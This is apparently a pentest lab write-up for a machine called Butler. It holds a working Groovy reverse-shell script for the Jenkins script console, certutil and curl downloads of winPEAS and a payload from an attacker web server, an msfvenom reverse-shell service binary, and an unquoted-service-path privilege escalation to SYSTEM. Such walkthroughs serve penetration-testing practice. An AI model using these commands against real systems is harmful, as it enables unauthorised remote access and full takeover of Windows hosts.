# BUTLER - 192.168.176.134
nmap showed TCP port 7680, 8080 Open
7680 was a 0  
8080 is a Jenkins server  
Browsing to website only shows jenkins dashboard  
Nikto scan `nikto -h 192.168.176.134 -p 8080`  
Brute force login for jenkins with Burpsuite
- Intruder --> Payload ClusterBomb  
Login was  jenkins:jenkins
Once logged in to jenkins, there is a  script area that accepts Groovy scripts.  
Founda  groovy exploit here : https://shahjerry33.medium.com/jenkins-exploitation-is-everything-2c61c5ae8377  

``` 
String host="192.168.176.128";
int port=9999;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); 
```  

This gave me a shell, with username Butler.  Butler is a local admin on hostname butler.  
net localgroup administrators  

## Windows Elevation   
From here, started enumerating with the winpeas script.  
```
started web server on kali : `python3 -m http.server`   
certutil.exe -urlcache -f http://192.168.176.128:8000/winPEASx64.exe winpeas.exe
move winpeas.exe c:\users\butler\downloads\
c:\users\butler\downloads\winpeas.exe
```

Found **UNQUOTED SERVICE PATHS** `cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """`  
Service is : C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe        
sc query WiseBootAssistant  

Created payload `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.176.128 LPORT=4446 -f exe-service -o Program.exe`  
start listener on attacker box : `nc -lvp 4446`
downloaded payload from target : `certutil.exe -urlcache -f http://192.168.176.128:8000/Program.exe Program.exe`
optional download syntax : `curl http://192.168.176.128:8000/Program.exe -o Program.exe`
Put payload at root of C:\
The payload  could optionally be called, wise.exe, and placed under wise folder.
sc stop WiseBootAssistant  
sc start WiseBootAssistant  
**BOOM** we are system.  

# BlackPearl - 192.168.176.135



